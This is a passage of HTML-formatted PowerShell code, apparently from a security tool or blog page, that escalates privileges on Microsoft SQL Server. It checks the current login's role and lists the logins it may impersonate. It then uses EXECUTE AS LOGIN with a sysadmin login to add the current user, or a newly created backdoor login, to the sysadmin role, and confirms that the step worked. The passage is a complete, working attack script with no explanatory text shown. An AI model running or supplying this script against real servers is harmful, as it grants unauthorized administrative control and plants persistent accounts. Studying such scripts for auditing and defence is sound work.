&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ErrorMessage = $_.Exception.Message</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Connection failed&quot; -foreground &quot;red&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Error: $ErrorMessage&quot; -foreground &quot;red&quot; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Break</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Check if the user is already a sysadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Open db connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$conn.Open()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Setup query</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$Query = &quot;select is_srvrolemember(&#39;sysadmin&#39;) as sysstatus&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Execute query</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$results = $cmd.ExecuteReader() </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Parse query results</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$TableIsSysAdmin = New-Object System.Data.DataTable</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$TableIsSysAdmin.Load($results) &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Check if current user is a sysadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$TableIsSysAdmin | Select-Object -First 1 sysstatus | foreach {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Checksysadmin = $_.sysstatus</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($Checksysadmin -ne 0){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] You&#39;re already a sysadmin - no escalation needed.&quot; -foreground &quot;green&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] All Done.&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Break &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Close db connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$conn.Close()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Get a list of the users that can be impersonated</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# ----------------------------------------------- &nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# User status</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Enumerating a list of users that can be impersonated...&quot; &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Open db connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$conn.Open()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Setup query</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$QueryDatabases = &quot;SELECT DISTINCT b.name</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;FROM sys.server_permissions a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;INNER JOIN sys.server_principals b</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ON a.grantor_principal_id = b.principal_id </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;WHERE a.permission_name = &#39;IMPERSONATE&#39;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Execute query &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryDatabases,$conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$results = $cmd.ExecuteReader()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Parse query results</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$TableImpUsers = New-Object System.Data.DataTable </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$TableImpUsers.Load($results)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Check if any users can be impersonated</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($TableImpUsers.rows.count -eq 0){</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Status user</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Sorry, the current user doesn&#39;t have permissions to impersonate anyone.&quot; -foreground &quot;red&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] All done.&quot; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Status user &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ImpUserCount = $TableImpUsers.rows.count &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Found $ImpUserCount users that can be impersonated:&quot; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Display users</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableImpUsers | foreach{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ImpUser = $_.name</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] - $ImpUser&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Close db connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$conn.Close() </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# ----------------------------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Check if any of the users that can be impersonated are sysadmins</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# ----------------------------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($TableImpUsers.rows.count -ne 0){ &nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Status user</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Checking if any of them are sysadmins...&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Setup data table to store list of sysadmins that can be impersonated</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableImpUserSysAdmins = New-Object System.Data.DataTable</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableImpUserSysAdmins.Columns.Add(&#39;name&#39;) | Out-Null</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableImpUsers | foreach {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Open db connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Open()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Setup query</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ImpUser = $_.name</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Query = &quot;select IS_SRVROLEMEMBER(&#39;sysadmin&#39;,&#39;$ImpUser&#39;) as status&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Execute query</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$results = $cmd.ExecuteReader() &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Parse query results</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableImpUserSysAdminsCheck = New-Object System.Data.DataTable </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableImpUserSysAdminsCheck.Load($results)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableImpUserSysAdminsCheck | foreach{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$SysAdminStatus = $_.status</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Check if the impersonatable user is a sysadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($SysAdminStatus -eq 0){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] - $ImpUser - NOT sysadmin&quot; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] - $ImpUser - sysadmin!&quot; -foreground &quot;green&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Add to data table</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableImpUserSysAdmins.Rows.Add($ImpUser) | Out-Null &nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Clear check</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableImpUserSysAdminsCheck.Clear()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Close db connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Close()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -------------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Attempt to escalate privileges</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -------------------------------------------------</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Verify that a sysadmin user can be impersonated</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ImpUserSysadminsCount = $TableImpUserSysAdmins.rows.count </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($ImpUserSysadminsCount -ne 0) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Open db connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Open()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Check if we are going to add a new sysadmin or elevate the current one for query</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($newuser -and $newPass){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$AddUser = &quot;CREATE LOGIN $newuser WITH PASSWORD = &#39;$newPass&#39;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$UsertoElevate = $newuser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Message = &quot; create and&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$AddUser = &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$UsertoElevate = $ConnectUser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Message = &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Status user</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Attempting to$Message add $UsertoElevate to the sysadmin role via impersonation...&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Get the sysadmin user that can be impersonated</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableImpUserSysAdmins | foreach {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ImpUser = $_.name</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Setup query</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Query = &quot;EXECUTE AS Login = &#39;$ImpUser&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$AddUser;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EXEC sp_addsrvrolemember &#39;$UsertoElevate&#39;,&#39;sysadmin&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;,&#39;$UsertoElevate&#39;) as status;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Execute query</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$results = $cmd.ExecuteReader() </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Status user</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Verifying that $UsertoElevate was added to the sysadmin role...&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Parse query results</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableVerify = New-Object System.Data.DataTable</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableVerify.Load($results) &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Check if user is a sysadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableVerify| Select-Object -First 1 status | foreach {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$VerifySysadmin = $_.status</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($VerifySysadmin -eq 1){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Success - $UsertoElevate is now a sysadmin!&quot; -foreground &quot;green&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] All Done.&quot; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Failed - Something went wrong!.&quot; -foreground &quot;red&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] All Done.&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Close db connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Close() &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Sorry, the $ConnectUser account can&#39;t impersonate any sysadmins.&quot; -foreground &quot;red&quot; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] All done.&quot; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span 